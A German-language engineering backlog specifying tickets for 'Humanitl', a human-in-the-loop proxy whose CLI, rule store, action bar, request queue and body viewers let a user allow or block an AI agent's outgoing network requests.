`DecideRequest` (Erweiterung von HUM-018):

```proto
message DecideRequest {
  string flow_id = 1;
  oneof decision { AllowDecision allow = 2; AllowEditedDecision allow_edited = 3; BlockDecision block = 4; }
  optional Rule remember = 5;     // wird vor dem Resume angelegt; scheitert das Anlegen, wird NICHT entschieden
}
message DecideResponse { optional Rule created_rule = 1; repeated Diagnostic diagnostics = 2; }
```

`RulesStore`:

```rust
pub struct RulesStore { persistent: RuleSet, session: RuleSet, path: PathBuf, session_id: SessionId }
impl RulesStore {
    pub fn load(path: &Path, bundled: &[Rule], session: SessionId) -> (Self, Vec<Diagnostic>);
    /// Effektive Reihenfolge für evaluate: Session-Regeln zuerst, dann persistente. Grund: Session-Regeln
    /// sind die jüngste Nutzerabsicht ("für diese Session erlauben") und müssen bundled Blocks überstimmen können.
    pub fn effective(&self) -> RuleSet;
    pub fn add(&mut self, rule: Rule, pos: Option<usize>) -> Result<Rule, Diagnostic>;  // Expiry Session → session, sonst persistent + save()
    pub fn update(&mut self, rule: Rule) -> Result<(), Diagnostic>;   // Expiry-Wechsel verschiebt zwischen Sets
    pub fn remove(&mut self, id: RuleId) -> Result<Rule, Diagnostic>;
    pub fn reorder(&mut self, id: RuleId, pos: usize) -> Result<(), Diagnostic>;
    pub fn reload(&mut self) -> Vec<Diagnostic>;
    fn save(&self) -> Result<(), Diagnostic>;   // temp + rename; RULES_009 bei IO-Fehler
}
```

Bundled-Regeln (aus `rules/default.yaml`, gefüllt in HUM-038) werden beim Laden hinter die Nutzerregeln gehängt, `bundled = true`, nicht in die Nutzerdatei geschrieben, nicht löschbar (Remove → RULES_010 Error, `fix: AddRule` mit gleichem Match und `action: ask` davor).

Dry-Run: `Recorder::list_flows` der letzten `scan_last` Flows, für jeden `RequestKey` bauen und `RuleSet::from([rule]).evaluate` → Treffer sammeln.

Nach jeder Änderung: `FlowEvent`-Stream bekommt kein Event; stattdessen eigener Broadcast `RulesChanged` (im `Subscribe`-Stream als `FlowEvent.oneof` Variante `rules_changed`), damit UI und CLI neu laden.

### Schritte
1. Proto erweitern, Codegen in CI grün.
2. `RulesStore` mit Tests (Session vs persistent, save atomar, bundled nicht löschbar).
3. RPC-Handler; `Decide.remember` atomar (erst Regel, dann Resume).
4. `RulesChanged`-Event.
5. Proxy nutzt `RulesStore::effective()` (Snapshot bei jeder Änderung als `Arc<RuleSet>` per `ArcSwap`).

### Tests
- `add_session_rule_not_persisted`: add mit `session_id` → `rules.yaml` unverändert, `list` zeigt sie.
- `add_persistent_writes_file`: Datei enthält die Regel, Roundtrip parsebar.
- `remember_atomic`: `Decide{allow, remember: ungültige Regel}` → Diagnostic, Flow bleibt Held.
- `bundled_remove_rejected` → RULES_010 mit `fix`.
- `dry_run_hits`: 20 Flows, Regel trifft 5 → `hits.len() == 5`.
- `reload_invalid_keeps_old`: Datei kaputt machen, reload → RULES_002, `effective()` unverändert.

### Akzeptanzkriterien
- [ ] Alle Tests grün; `buf lint` sauber.
- [ ] `grpcurl -unix … humanitl.v1.Humanitl/Rules` mit `{"list":{}}` liefert bundled Regeln mit `bundled: true`.
- [ ] `rules.yaml` wird nie mit Session-Regeln geschrieben (Test greift Datei-Inhalt).

### Fallstricke
- `save()` muss die Datei mit Modus 0600 anlegen.
- Reihenfolge Session-vor-Persistent ist eine Sicherheitsentscheidung: eine Session-`allow` überstimmt bundled `block`. Das ist gewollt und im UI sichtbar (Temporär-Tab oben). Nicht „optimieren".
- Position bei `add` bezieht sich auf das jeweilige Set (session oder persistent), nicht auf die effektive Liste.

### Referenzen
BACKLOG.md ADR-007, ADR-011 (temporäre Regeln); CONVENTIONS.md 3.3, 3.6; `arc-swap` (https://docs.rs/arc-swap).

---

## HUM-065 · CLI rules/flows
Sprint: 2 · Größe: S · Abhängigkeiten: HUM-064, HUM-027, HUM-026 · Blockiert: HUM-036

### Kontext
ADR-013: die CLI ist erstklassig. Escape-Test 4 und die e2e-Skripte brauchen `rules test` und `flows list` ohne UI.

### Ziel
`humanitl rules list|add|remove|test` und `humanitl flows list|show` als gRPC-Clients mit Tabellen- und JSON-Ausgabe.

### Nicht-Ziel
Interaktive Editoren, `config`/`audit`/`daemon` (HUM-070).

### Betroffene Pfade
- `daemon/bin/humanitl/src/cmd/{rules,flows}.rs` (neu)
- `daemon/bin/humanitl/src/output.rs` (neu: Tabelle via `comfy-table`, JSON via serde)
- `daemon/bin/humanitl/tests/cli_rules_flows.rs` (neu, gegen In-Process-Daemon)

### Spezifikation

```
humanitl rules list [--json] [--all]            # --all inkl. bundled und abgelaufene
humanitl rules add --action allow|block|ask|redact --host PATTERN [--method M]... [--path P] [--scheme S] [--port N] [--upgrade websocket] [--expires never|session|RFC3339] [--note TEXT] [--position N] [--json]
humanitl rules remove ID [--json]
humanitl rules test URL [--method M] [--upgrade websocket] [--json]   # gibt Verdict aus, Exit 0 allow, 10 block, 11 ask
humanitl flows list [FILTER...] [--limit N] [--sort ts|host|duration|size] [--asc] [--json]
humanitl flows show ID [--json] [--body request|response] [--raw]
```

Tabellen-Spalten `rules list`: `POS  ACTION  HOST  METHODS  PATH  EXPIRES  ORIGIN  ID`. `ORIGIN` ∈ `user | session | bundled`. Abgelaufene grau (nur mit `--all`).

Tabellen-Spalten `flows list`: `SEQ  TIME  STATE  DECISION  METHOD  HOST  PATH  STATUS  SIZE  MS  FINDINGS  RULE`. `PATH` mittig gekürzt auf 40 Zeichen. `TIME` lokale Zeit `HH:MM:SS`.

`rules test` Ausgabe (Text):

```
url:      https://api.github.com/repos/x
host:     api.github.com (apex github.com)
verdict:  allow
rule:     018f… (pos 3, "npm install")
```

`--json` gibt die Proto-Messages als JSON (prost `serde`-Feature oder `pbjson`) aus, ein Objekt pro Aufruf; bei `flows list` ein Objekt mit `rows` und `next_cursor`.

Fehler: Daemon nicht erreichbar → Exit 2, Diagnostic DAEMON_001 auf stderr im Format:

```
error DAEMON_001: Humanitl daemon is not running
  why: no socket at /run/user/1000/humanitl/daemon.sock
  fix: humanitl daemon install && systemctl --user start humanitld
```

### Schritte
1. `output.rs` mit `Table`/`Json`-Renderer und Diagnostic-Renderer (wird von allen Subkommandos genutzt).
2. `rules` Subkommandos.
3. `flows` Subkommandos.
4. Integrationstest startet Daemon in-process mit Temp-XDG-Verzeichnissen und ruft die CLI-Funktionen direkt.

### Tests
- `rules_test_exit_codes`: allow → 0, block → 10, ask → 11.
- `flows_list_filter_passthrough`: Filter-String wird unverändert an `ListFlows.filter` übergeben; ungültiger Key → Exit 1 mit RECORDER_002.
- `json_output_parseable`: `--json` ist gültiges JSON und enthält `rows`.
- `daemon_down_exit_2`.

### Akzeptanzkriterien
- [ ] `humanitl rules test https://evil.example` mit Default-Regeln → `verdict: ask`, Exit 11.
- [ ] `esc-4.sh` nutzt `humanitl rules test` für die Tabelle aus HUM-022 (Auszug: Fälle 1–15) und ist grün.
- [ ] `humanitl flows list 'host:github.com findings:>0'` liefert Tabelle ohne Panik bei leerem Ergebnis.

### Fallstricke
- Unicode-Hosts in der Tabelle: U-Label anzeigen, A-Label in `--json`.
- Terminal-Breite beachten (`comfy-table` `ContentArrangement::Dynamic`).
- Exit-Codes aus CONVENTIONS 3.8 plus die hier definierten 10/11 für `rules test`; alle in `--help` dokumentieren.

### Referenzen
CONVENTIONS.md 3.8; HUM-026 Filter-Grammatik; `comfy-table` (https://docs.rs/comfy-table).

---

## HUM-028 · Aktionsleiste komplett
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-020, HUM-027, HUM-008 · Blockiert: HUM-029, HUM-036

### Kontext
Die Aktionsleiste ist der Ort jeder Entscheidung. Sie setzt die Usability-Regeln aus BACKLOG.md Abschnitt 5 um: Enter = Allow einmal unverändert, Allow und Block nie benachbart, Regel wird als Satz gezeigt, Default-Dauer Session, Signature-Element Release Valve.

### Ziel
`ActionBar`-Widget im Inspector-Pane mit Release-Valve-Pill, Dauer × Ziel-Raster, Live-Regelsatz, Block-Button, Edit+Allow-Button, Intents und Shortcuts, Inline-Bestätigung mit Undo. Alle Entscheidungen laufen über `Decide` mit optionalem `remember`.

### Nicht-Ziel
Editor (HUM-047), Batch (HUM-029), Findings-Warnung beim Senden (HUM-049).

### Betroffene Pfade
- `app/lib/features/intercept/widgets/action_bar.dart` (neu)
- `app/lib/features/intercept/widgets/release_valve.dart` (neu)
- `app/lib/features/intercept/widgets/remember_grid.dart` (neu)
- `app/lib/features/intercept/rule_sentence.dart` (neu)
- `app/lib/features/intercept/intents.dart` (neu: alle Intents aus CONVENTIONS 3.9)
- `app/lib/features/intercept/providers/decision_provider.dart` (neu)
- `app/l10n/app_en.arb`, `app_de.arb` (ändern)
- `app/test/features/intercept/{action_bar_test,rule_sentence_test,release_valve_test}.dart` (neu)
- `app/test/goldens/action_bar_*.png` (neu)

### Spezifikation

Layout (Breite = Inspector-Pane, Höhe 48 px + optional 24 px Satzzeile; Padding 12 px; Hintergrund `bg-1`, oben Hairline `line`):

```
| [ Allow ▾ ]   [ ✎ Edit + Allow ]        Remember: [Once][Session][1h][Forever]  [URL][Host][Apex][Host+Method]            [ Block ] |
|   allow · GET · *.npmjs.org · this session                                                                                          |
```

- Release Valve (`ReleaseValve`): Pill 32 px hoch, min 120 px breit, Radius 16, Fläche `accent` 12 % Alpha, Text `fg-0` 13/500 „Allow", rechts vom Hairline-Trenner ein 28 px breites Chevron-Segment. Klick links → `AllowIntent(remember: null)`. Klick Chevron → Raster ein-/ausblenden. Press-and-hold links 400 ms: Fläche füllt sich linear mit `allowed` (#4FBF8C) 20 % Alpha, Label wechselt zu „Allow for session"; Loslassen nach Ablauf → `AllowIntent(remember: Rule(host exakt, session))`; Loslassen vorher → normaler Klick. Fokus-Ring `accent` 2 px.
- Edit + Allow: Ghost-Button, Icon `lucide.pencil`, öffnet den Editor (HUM-047; bis dahin öffnet er den Raw-Body read-only mit Hinweis „Editor kommt in Sprint 4", ARB `intercept_editor_pending`).
- Remember-Raster (`RememberGrid`): zwei Segmented Controls. Dauer: `once | session | 1h | forever`, Default `session`. Ziel: `url | host | apex | hostMethod`, Default `host`. Auswahl `once` deaktiviert das Ziel-Segment (ausgegraut) und den Satz. Tastatur: `1/2/3/4` Dauer, `Shift+1..4` Ziel.
- Block: Ghost-Button ganz rechts, Text `blocked` (#E5646E), Icon `lucide.shield-x`, mindestens 160 px Abstand zur Valve (Layout erzwingt Spacer; bei zu schmalem Pane wandert Block in eine zweite Zeile rechtsbündig). Kein Enter-Default. Wenn Remember ≠ once und Ziel gewählt: Block legt Block-Regel an, mit 250 ms Press-and-hold-Bestätigung.
- Satzzeile: Mono 12 `fg-1`, generiert aus `ruleSentence`.

Regelsatz-Generator:

```dart
enum RememberDuration { once, session, oneHour, forever }
enum RememberTarget { url, host, apex, hostMethod }
class RuleDraft { final RememberDuration duration; final RememberTarget target; final Flow flow; }

/// Baut die Regel für Decide.remember. `once` → null.
Rule? buildRule(RuleDraft d, {required SessionId session, required DateTime now, required String Function(String host) apexOf});
/// Satz für die Anzeige, lokalisiert.
String ruleSentence(RuleDraft d, AppLocalizations l10n);
```

Mapping Ziel → `RuleMatch`: `url` → `host` exakt, `path` exakt (ohne Query), `methods = [m]`, `scheme`, `port`; `host` → `host` exakt; `apex` → `host = "**." + apexOf(host)`; `hostMethod` → `host` exakt, `methods = [m]`. Dauer → Expiry: `session` → `session_id`, `oneHour` → `at = now + 1h`, `forever` → `never`.

Satzformat: `<action> · <method oder ∗> · <host-pattern>[ · <path>] · <duration>`. Beispiele:

| Ziel | Dauer | en | de |
|---|---|---|---|
| host | session | `allow · ∗ · api.github.com · this session` | `Erlauben · ∗ · api.github.com · diese Session` |
| hostMethod | forever | `allow · GET · api.github.com · always` | `Erlauben · GET · api.github.com · immer` |
| apex | oneHour | `allow · ∗ · **.github.com · for 1 hour` | `Erlauben · ∗ · **.github.com · für 1 Stunde` |
| url | session | `allow · POST · api.github.com · /graphql · this session` | `Erlauben · POST · api.github.com · /graphql · diese Session` |
| host | session, Block | `block · ∗ · evil.example · this session` | `Blockieren · ∗ · evil.example · diese Session` |

ARB-Schlüssel: `intercept_allow`, `intercept_allow_for_session`, `intercept_edit_allow`, `intercept_block`, `intercept_remember`, `intercept_duration_once|session|hour|forever`, `intercept_target_url|host|apex|host_method`, `intercept_sentence_allow`, `intercept_sentence_block`, `intercept_sentence_this_session`, `intercept_sentence_always`, `intercept_sentence_for_hour`, `intercept_sent_to` (`Sent to {host} · {size}`), `intercept_rule_saved` (`Rule saved`), `intercept_undo`, `intercept_blocked_retry` (`Blocked. The agent may retry.`).

Ablauf nach Entscheidung (`decisionProvider`): `Decide` senden → bei Erfolg Karte 3 s lang mit Bestätigungsstreifen (Höhe 28 px, `allowed`/`blocked` 10 % Alpha): „Sent to api.github.com · 2.1 KB" bzw. „Blocked. The agent may retry."; wurde eine Regel angelegt: „Rule saved · Undo" 10 s; Undo → `Rules(remove)`. Danach verlässt die Karte die Queue (Animation aus HUM-020). Fehler → Diagnostic inline in der Karte, Karte bleibt.

Intents: `Shortcuts`/`Actions` auf `InterceptScreen`-Ebene (CONVENTIONS 3.9). `AllowIntent` bindet Enter, `A`, Ctrl+F; `Shift+Enter` öffnet das Raster. Shortcuts sind inaktiv, solange ein `TextField` Fokus hat (Filter, Editor).

### Schritte
1. `intents.dart` mit allen Intent-Klassen und `defaultShortcuts`-Map.
2. `rule_sentence.dart` mit `buildRule`/`ruleSentence`; Unit-Tests für die fünf Beispiele in beiden Sprachen.
3. `ReleaseValve` mit Press-and-hold (Timer 400 ms, `AnimationController`), Golden-Tests idle/hover/holding.
4. `RememberGrid`, `ActionBar` Layout inklusive Umbruch bei < 640 px.
5. `decisionProvider` mit Bestätigung/Undo; Fake-Daemon (HUM-005) unterstützt `remember`.
6. ARB-Strings.

### Tests
- `rule_sentence_test`: 5 Beispiele × en/de.
- `build_rule_test`: Ziel/Dauer-Kombinationen erzeugen erwartete `RuleMatch`/`Expiry`; `once` → null.
- `release_valve_test`: Tap → Allow ohne Regel; Hold 450 ms → Allow mit Session-Regel; Hold 300 ms → Allow ohne Regel.
- `action_bar_test`: Enter ohne Fokus in TextField → `Decide{allow}`; Enter mit Fokus im Filter → nichts; `B` → Block; Block und Allow haben ≥ 160 px Abstand bei 900 px Breite.
- `undo_test`: Regel angelegt, Undo innerhalb 10 s → `Rules(remove)` aufgerufen.
- Goldens: `action_bar_default`, `action_bar_grid_open`, `action_bar_narrow`, `release_valve_holding`.

### Akzeptanzkriterien
- [ ] Alle Tests und Goldens grün (alchemist CI-Modus).
- [ ] Manuell: mit Fake-Daemon Enter drücken → Karte verlässt Queue, History (sobald HUM-032) zeigt `allow`.
- [ ] Kein String hart im Code (`flutter gen-l10n` deckt alle Texte).
- [ ] Hit-Targets: jedes klickbare Element ≥ 28 px hoch (Widget-Test prüft `Size`).

### Fallstricke
- `Shortcuts` fangen Enter auch in TextFields, wenn sie über dem `Focus` des Feldes liegen. `Actions` mit `Action.overridable` oder Prüfung `FocusManager.instance.primaryFocus?.context` auf `EditableText`.
- Press-and-hold auf Touchpad-Klick: `GestureDetector.onLongPressStart` hat eigenen Timeout (500 ms); eigenen Timer über `onTapDown/onTapUp/onTapCancel` verwenden.
- `apexOf` kommt vom Daemon (`DomainInfo.apex` im Flow), nicht clientseitig berechnen.
- Undo nach Ablauf der 10 s muss über Rules-Screen möglich bleiben, der Streifen verschwindet nur.

### Referenzen
BACKLOG.md Abschnitt 5 (Interaktion, Signature-Element 1), Usability-Review §3; CONVENTIONS.md 3.9; Claude Code Permission-Satz (https://code.claude.com/docs/en/permissions); Little Snitch Regel-Dauer (https://help.obdev.at/littlesnitch6/pref-alert).

---

## HUM-029 · Queue-Gruppierung und Batch
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-028, HUM-031 (Katalog-Name, optional) · Blockiert: HUM-036

### Kontext
`npm install` feuert 15 Requests in 20 Sekunden. Eine flache Liste erzeugt Panik-Klicks auf „Allow all". Gruppierung nach Host mit Katalog-Identität und Findings-Zähler macht Batch-Entscheidungen sicher; die Liste bewegt sich nie unter dem Cursor.

### Ziel
Die Queue gruppiert gehaltene Flows nach Host, zeigt pro Gruppe eine Summary-Zeile mit Batch-Aktionen, unterstützt Multi-Select und friert die Reihenfolge ein, solange der Nutzer liest.

### Nicht-Ziel
Gruppierung in History (dort Filter), Regeln aus Gruppen mit Pfad-Scope (nur Host/Apex/Host+Method wie HUM-028).

### Betroffene Pfade
- `app/lib/features/intercept/providers/held_groups_provider.dart` (neu)
- `app/lib/features/intercept/providers/queue_freeze_provider.dart` (neu)
- `app/lib/features/intercept/providers/selection_provider.dart` (neu)
- `app/lib/features/intercept/widgets/queue_pane.dart` (ändern)
- `app/lib/features/intercept/widgets/group_header_row.dart` (neu)
- `app/lib/features/intercept/widgets/batch_bar.dart` (neu)
- `app/test/features/intercept/{held_groups_test,queue_freeze_test,batch_test}.dart` (neu)

### Spezifikation

```dart
@freezed class HeldGroup with _$HeldGroup {
  const factory HeldGroup({
    required String host,            // A-Label
    required String hostDisplay,
    required List<Flow> flows,       // sortiert nach ts asc
    required CatalogEntry? catalog,  // aus flow.domain.catalogId
    required int findingsTotal,
    required Set<String> methods,
    required DateTime earliestDeadline,
  }) = _HeldGroup;
}

@riverpod List<HeldGroup> heldGroups(Ref ref);   // aus heldFlowsProvider; Gruppen sortiert nach earliestDeadline asc
```

Darstellung: Gruppe mit 1 Flow → normale Zeile (wie HUM-020). Gruppe mit ≥ 2 Flows → Header-Zeile (36 px): Chevron, Favicon-Slot, `catalog?.name ?? hostDisplay` 13/500, Chip `{n}`, Methoden-Mix als Mono-Text `12× GET · 2× POST`, Findings-Chip (`0 findings` in `fg-2`, `>0` in `secret`-Orange), Countdown der frühesten Deadline. Rechts bei Hover: `Allow {n}` und `Block {n}` Ghost-Buttons. Default eingeklappt bei `n ≥ 3`, aufgeklappt bei `n == 2`; Zustand pro Host in `expandedHostsProvider` (Session-lokal).

Summary-Text (ARB `intercept_group_summary`): `{name} · {n} requests · {methods} · {findings}`; mit Katalog zusätzlich `intercept_group_looks_like`: `Looks like: {catalog.typical.first}` (z. B. „Looks like: npm install").

Batch: `Allow {n} → {host}` (ARB `intercept_allow_group`) wendet das aktuelle Remember-Raster (HUM-028) einmal an: eine `Decide` pro Flow, die Regel nur einmal (mit dem ersten Flow als `remember`, weitere ohne). `Block {n}` bei `n > 5` → Modal (`HDialog`) „Block 14 requests to registry.npmjs.org? The agent will receive 403 for each." mit Liste der Pfade; bei `n ≤ 5` direkt. Ein globales „Allow everything in queue" existiert nur im Command-Palette-Eintrag `Queue: allow all…` und öffnet immer ein Modal mit Host-Liste.

Selektion (`selectionProvider`, `Set<FlowId>`): Klick = einzeln, `Ctrl+Klick` toggelt, `Shift+Klick` Bereich innerhalb der Gruppe, `Ctrl+A` bei Fokus in Queue = alle sichtbaren Flows der aktuell selektierten Gruppe. Bei Selektion > 1 zeigt die Aktionsleiste `Allow {n} selected` / `Block {n} selected`; Enter gilt für alle selektierten.

Einfrieren (`queueFreezeProvider`): Die Queue rendert einen Snapshot `frozenOrder: List<FlowId>`. Neue Flows werden nicht eingefügt, sondern gezählt, solange (a) der Mauszeiger im Queue-Pane ist oder (b) die letzte Tastaturnavigation < 2 s her ist oder (c) eine Selektion > 1 besteht. Pill oben im Pane: `+3 new` (ARB `intercept_new_since_reading`); Klick oder Verlassen des Panes für > 500 ms → Merge (Snapshot neu berechnen, Ankunfts-Animation nur für die neuen Zeilen). Entfernte Flows (entschieden, Timeout) verlassen den Snapshot sofort mit Exit-Animation; das ist erlaubt, weil sie unterhalb des Cursors nur Platz freigeben, nie etwas hineinschieben. Ausnahme: Timeout-Zeilen bleiben 3 s als graue Zeile „Blocked (timed out)" stehen.

### Schritte
1. `heldGroupsProvider` + Tests (Sortierung, Findings-Summe, Katalog-Zuordnung).
2. `queueFreezeProvider` als `Notifier` mit den drei Bedingungen; Tests mit `FakeAsync`.
3. `GroupHeaderRow`, Einklappen, Hover-Buttons.
4. `selectionProvider`, Tastatur-/Maus-Bindung.
5. Batch-Aktionen in `decisionProvider` (Liste von FlowIds, eine Regel).
6. Modal für Block > 5 und Palette-Eintrag.

### Tests
- `groups_sorted_by_deadline`.
- `freeze_while_hover`: Hover → neuer Flow → `frozenOrder` unverändert, Counter 1; Pointer raus + 600 ms → gemerged.
- `freeze_after_keyboard_nav`: `J` gedrückt → 1 s später neuer Flow → nicht gemerged; 2,5 s → gemerged.
- `batch_allow_one_rule`: 4 Flows, Session-Regel → 4 `Decide`, genau eines mit `remember`.
- `block_gt5_needs_modal`: 6 Flows → Modal sichtbar; Bestätigen → 6 `Decide{block}`.
- `ctrl_a_selects_group`.
- Golden: `queue_grouped_collapsed`, `queue_grouped_expanded`, `queue_new_pill`.

### Akzeptanzkriterien
- [ ] Tests und Goldens grün.
- [ ] Manuell mit Fake-Daemon (Szenario `npm_install.jsonl`, 15 Flows/20 s): keine Zeile bewegt sich, während der Zeiger über der Queue steht; Pill zählt hoch.
- [ ] Kein Button mit Text „Allow all" existiert außerhalb des Palette-Modals (`grep -r "allow_all" app/l10n` zeigt nur `palette_queue_allow_all`).

### Fallstricke
- `ListView` mit `key: ValueKey(flowId)` pro Zeile, sonst springen Animationen bei Merge.
- Einfrieren darf `heldFlowsProvider` nicht verändern; nur die Render-Reihenfolge ist eingefroren. Countdown-Timer laufen weiter.
- Batch-Decide sequentiell senden (nicht `Future.wait`), damit die Regel vor den Folge-Entscheidungen existiert; sonst werden Folge-Flows evtl. gehalten statt per Regel entschieden. Alternativ: alle Flows explizit entscheiden (so spezifiziert), Regel gilt für spätere.

### Referenzen
BACKLOG.md Abschnitt 5 (Interaktion), Usability-Review §2; CONVENTIONS.md 3.9 Provider-Namen.

---

## HUM-030 · Body-Ansichten
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-020, HUM-025, HUM-026 · Blockiert: HUM-032, HUM-047

### Kontext
Der Nutzer muss in Sekunden erfassen, was im Body steht. JSON als Baum, Formulare als Tabelle, Rohtext mit Findings-Markierung, Binärdaten als Hex. Große Bodies dürfen die UI nicht blockieren.

### Ziel
`BodyView`-Widget mit Ansichten JSON-Tree, Form, Raw, Hex, automatischer Auswahl nach Content-Type mit Sniffing, Findings-Overlay, Parsing in Isolates, Caps für große Bodies.

### Nicht-Ziel
Bearbeiten (HUM-047), Bilder/PDF-Vorschau, Syntax-Highlighting jenseits JSON/XML/Form.

### Betroffene Pfade
- `app/lib/features/intercept/body/{body_view,body_kind,json_tree_view,form_view,raw_view,hex_view,body_parser}.dart` (neu)
- `app/lib/features/intercept/providers/flow_body_provider.dart` (neu: `flowBodyProvider(BodyRef)`)
- `app/lib/core/domain/finding.dart` (ändern, falls Span-Helfer fehlen)
- `app/test/features/intercept/body/*.dart`, Goldens

### Spezifikation

```dart
enum BodyKind { json, form, xml, text, binary, empty, tooLarge }

/// Reihenfolge der Erkennung:
/// 1. size == 0 → empty. 2. size > 8 MiB → tooLarge.
/// 3. Content-Type (mime-Parsing, Parameter ignorieren): application/json, +json → json;
///    application/x-www-form-urlencoded → form; application/xml, text/xml, +xml, text/html → xml; text/* → text.
/// 4. Sniffing der ersten 512 Bytes, wenn kein oder unbekannter Content-Type: nach Whitespace `{` oder `[` → json;
///    `<?xml` oder `<` → xml; Muster `^[^=&\s]+=[^&]*(&[^=&\s]+=[^&]*)*$` → form;
///    Anteil Bytes außerhalb 0x09,0x0A,0x0D,0x20–0x7E und gültigem UTF-8 > 30 % → binary; sonst text.
BodyKind detectBodyKind(Uint8List bytes, String? contentType);
```

Provider: `flowBodyProvider(BodyRef)` lädt über `GetBody` (Stream), dekomprimiert nach `Content-Encoding` (Dart `dart:io` `gzip`/`zlib`, brotli via Daemon-seitig bereits dekodiertem Pfad: `GetBody` hat Flag `decoded = true`, der Daemon liefert dekodiert bis Cap), cached LRU 32 Einträge / 64 MiB. Parsing (`BodyParser.parse(bytes, kind)`) läuft in `Isolate.run`, wenn `size > 64 KiB`.

Ansichten:
- **JSON-Tree**: `TreeView` aus `two_dimensional_scrollables`, lazy: Kinder werden erst beim Aufklappen gebaut; Wurzel-Ebene aufgeklappt, alles darunter zu; Zeile 24 px, Key 13 Mono `fg-0`, Wert nach Typ (String `fg-1`, Zahl/Bool `accent`, null `fg-2`); lange Strings auf 200 Zeichen gekürzt mit „…" und Tooltip; Zähler `{3}`/`[12]` an geschlossenen Knoten; Kontextmenü „Copy value", „Copy path" (JSONPath). Findings: pro Finding wird der Treffer-Text (`bytes[span]`) gesucht; jeder String-Wert, der ihn enthält, bekommt orangenen/amber Unterstrich und den Elternpfad einen Punkt.
- **Form**: `HTable` zwei Spalten Key/Value, percent-dekodiert, `+` → Leerzeichen; Findings-Span über Offset-Tabelle wie HUM-025 auf den dekodierten Wert.
- **Raw**: `re_editor` `CodeEditor` read-only, Mono 13, Zeilennummern, Wrap aus, horizontales Scrollen; Findings als `TextSpan`-Dekoration (Unterstrich 1 px `secret` #F0784F für Tier Checksum/Regex bei ApiKey/Jwt/Iban/CreditCard, `held` #E0B24A für Email/Phone/Ipv4/UserTerm) mit Hover-Popover `{kind} · {tier}`; Zeilenumbrüche werden nie hinzugefügt (kein Auto-Wrap, Spans bleiben korrekt).
- **Hex**: 16 Bytes pro Zeile, Spalten Offset (8 Hex) | Bytes | ASCII; Mono 12; nur erste 64 KiB, danach Hinweis (ARB `body_hex_truncated`).
- **tooLarge**: Karte: Größe, Content-Type, „Scanned {size}, {n} findings" (aus `Analyzed`), Raw der ersten 64 KiB read-only.

Umschalter: Segmented Control `Tree | Form | Raw | Hex` je nach Kind (json: Tree/Raw/Hex; form: Form/Raw/Hex; xml/text: Raw/Hex; binary: Hex/Raw). Auswahl pro Flow gemerkt (`bodyViewModeProvider(FlowId)`).

### Schritte
1. `detectBodyKind` + Tests (12 Fälle inklusive Sniffing ohne Content-Type, BOM, leerer Body).
2. `flowBodyProvider` mit LRU und Isolate-Parsing; Test mit 5 MiB JSON: UI-Thread-Frame > 16 ms wird nicht überschritten (Test misst `SchedulerBinding` Frame-Zeiten grob) und Ergebnis korrekt.
3. `JsonTreeView` lazy; Test mit 10k Knoten: Aufbau < 100 ms, Aufklappen eines Knotens baut nur dessen Kinder.
4. `FormView`, `RawView` mit Dekorationen, `HexView`.
5. Findings-Mapping in Tree und Form.
6. Goldens für alle vier Ansichten mit Findings.

### Tests
- `detect_json_without_ct`, `detect_form_by_pattern`, `detect_binary_ratio`, `detect_too_large`.
- `json_tree_lazy_children`.
- `raw_findings_decoration_positions`: Body `{"email":"a@b.de"}` mit Finding-Span → Dekoration exakt über `a@b.de`.
- `form_decoded_plus`: `a=x+y` → Wert `x y`.
- `hex_first_64k_only`.
- Goldens: `body_json_tree_findings`, `body_form`, `body_raw_findings`, `body_hex`.

### Akzeptanzkriterien
- [ ] Tests und Goldens grün.
- [ ] 8 MiB JSON im Fake-Daemon-Szenario `big_body.jsonl`: UI bleibt bedienbar (Scrollen in der Queue ruckelt nicht sichtbar), Tree erscheint nach < 1 s.
- [ ] Findings-Chips in der Karte (HUM-020) springen bei Klick zur ersten Fundstelle in der aktiven Ansicht (Raw scrollt, Tree klappt Pfad auf).

### Fallstricke
- `re_editor` mit Wrap erzeugt visuelle Zeilen, die Offsets verschieben; Wrap aus.
- Spans sind Byte-Offsets; für `TextSpan` in Zeichen umrechnen (UTF-8 → UTF-16 Code Units). Helfer `byteToCharOffset(bytes, byteOffset)` mit Test für Umlaute und Emoji.
- `Isolate.run` kann keine Widgets oder Providers empfangen; nur `Uint8List` rein, plain Dart-Objekte raus.
- JSON mit doppelten Keys: `jsonDecode` behält den letzten; für die Anzeige eigenen tolerant-Parser (oder `json_annotation` nicht nötig): akzeptabel im MVP, Hinweis-Zeile „duplicate keys collapsed" wenn erkannt (einfacher Vorab-Scan).

### Referenzen
BACKLOG.md 3.5 (Isolates), Abschnitt 5 (Typo, Farben); CONVENTIONS.md 3.9; two_dimensional_scrollables TreeView (https://pub.dev/packages/two_dimensional_scrollables); re_editor (https://pub.dev/packages/re_editor).

---

## HUM-031 · Domain-Panel v1
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-004, HUM-023 (Received-Event), HUM-020 · Blockiert: HUM-029, HUM-036

### Kontext
**Entscheidung 2026-09-03, Rangliste:** Nicht Tranco. Die Standardliste dort mischt fuenf Quellen, darunter Cloudflare Radar unter CC BY-NC 4.0. Eine Nicht-kommerziell-Klausel ist genau die zusaetzliche Beschraenkung, die die GPL der Weitergabe verbietet; ein Hinweis daneben aendert daran nichts. Geliefert wird deshalb ein Ausschnitt der Majestic Million unter CC BY 3.0, mit Namensnennung und Aenderungsliste in `catalog/RANKS-LICENSE`. Das Proto-Feld heisst weiterhin `tranco_rank`, weil ein Umbenennen zwei Crates und die Oberflaeche braeuchte; ein eigener Chore zieht es auf `popularity_rank` nach.

Der Domain-Kontext ist der „De-Panicker": erkannter Dienst plus null Findings heißt „sicher zu batchen". Alles kommt aus gebündelten Daten; es gibt keinen automatischen Fetch (ADR-006).

### Ziel
Die Crate `humanitl-catalog` liefert `DomainInfo` (Apex, Katalogeintrag, Verbreitungsrang, Zähler) und hängt es an `FlowEvent::Received`. Das UI zeigt rechts die Katalog-Karte oder die Unbekannt-Karte mit Schnellregeln.

### Nicht-Ziel
Live-Favicon/og:title-Fetch (M9), Screenshots (M9), Nutzer-Kataloge (M7), mehr als ~30 Einträge (Rest bis 200 in HUM-059 Doku-Sprint ergänzt).

### Betroffene Pfade
- `daemon/crates/catalog/src/{lib,psl,ranks,store}.rs` (neu)
- `catalog/domains.yaml` (neu), `catalog/icons/*.svg` (neu), `catalog/ranks-top100k.csv.gz` (neu, mit `catalog/RANKS-LICENSE`)
